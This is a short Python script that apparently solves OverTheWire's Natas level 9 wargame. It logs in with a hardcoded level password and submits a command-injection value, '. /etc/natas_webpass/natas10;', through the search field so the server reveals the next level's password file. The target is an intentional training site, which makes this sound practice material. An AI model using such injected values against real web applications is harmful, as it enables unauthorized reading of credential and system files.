import requests
import re

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.Session()

response = session.post(url, auth=(username, password), data={"needle": ". /etc/natas_webpass/natas10;", "submit": "submit"})

content = response.text

flag = re.findall(r"<pre>\n(.*)\n</pre>", content)[0]

print(flag)